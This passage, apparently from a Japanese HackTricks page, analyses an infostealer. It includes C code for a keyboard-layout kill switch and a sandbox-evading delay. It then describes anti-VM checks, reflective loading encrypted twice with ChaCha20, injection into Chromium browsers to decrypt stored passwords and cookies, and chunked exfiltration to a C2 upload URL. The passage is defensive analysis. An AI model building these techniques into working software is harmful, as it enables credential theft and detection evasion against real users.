int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### 多層化された `check_antivm` ロジック

- Variant A はプロセス一覧を走査し、各名前をカスタムのローリングチェックサムでハッシュ化して embedded blocklists for debuggers/sandboxes と比較します。さらにコンピュータ名に同じチェックサムを繰り返し適用し、`C:\analysis` のような作業ディレクトリを確認します。
- Variant B はシステムプロパティ（process-count floor、recent uptime）を検査し、VirtualBox の追加を検出するために `OpenServiceA("VBoxGuest")` を呼び出し、スリープ周辺でのタイミングチェックにより single-stepping を検出します。いずれかがヒットするとモジュール起動前に中止します。

### ファイルレスヘルパー + double ChaCha20 リフレクティブロード

- プライマリの DLL/EXE は Chromium credential helper を埋め込み、ディスクにドロップするかメモリに手動マップします。fileless モードではインポート/リロケーションを自身で解決するため、ヘルパーの痕跡は書き込まれません。
- そのヘルパーは second-stage DLL を ChaCha20 で二重に暗号化して格納します（two 32-byte keys + 12-byte nonces）。両パスの後、blob を reflectively load（`LoadLibrary` は使わない）し、[ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) 由来のエクスポート `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` を呼び出します。
- ChromElevator のルーチンは direct-syscall reflective process hollowing を用いて稼働中の Chromium ブラウザへ注入し、AppBound Encryption keys を継承して、ABE による強化があっても SQLite データベースからパスワード/クッキー/クレジットカード情報を直接復号します。

### モジュラーなインメモリ収集 & チャンク化 HTTP exfil

- `create_memory_based_log` はグローバルな `memory_generators` 関数ポインタテーブルを反復し、有効なモジュール（Telegram, Discord, Steam, screenshots, documents, browser extensions など）ごとにスレッドを生成します。各スレッドは共有バッファに結果を書き込み、約45秒の join ウィンドウ後にファイル数を報告します。
- 完了後、すべてを静的リンクされた `miniz` ライブラリで圧縮し `%TEMP%\\Log.zip` とします。`ThreadPayload1` は15秒スリープした後、アーカイブを10MBチャンクで HTTP POST により `http://<C2>:6767/upload` へストリームし、ブラウザの `multipart/form-data` 境界（`----WebKitFormBoundary***`）を偽装します。各チャンクには `User-Agent: upload`、`auth: <build_id>`、オプションで `w: <campaign_tag>` を付加し、最後のチャンクには `complete: true` を付けて C2 に再組み立て完了を知らせます。

## 参考文献

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)


{{#include ../banners/hacktricks-training.md}}
